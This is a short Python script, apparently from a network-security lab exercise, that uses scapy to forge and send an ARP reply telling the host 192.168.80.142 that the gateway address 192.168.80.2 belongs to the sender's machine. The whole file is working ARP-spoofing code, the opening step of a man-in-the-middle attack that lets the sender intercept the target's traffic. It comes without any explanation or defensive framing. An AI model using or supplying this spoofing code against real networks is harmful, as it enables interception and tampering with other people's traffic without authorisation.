#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst='192.168.80.142', hwdst='00:0c:29:eb:9a:14', psrc='192.168.80.2')

# print(packet.show())
# print("*" * 40)
# print(packet.summary())

scapy.send(packet)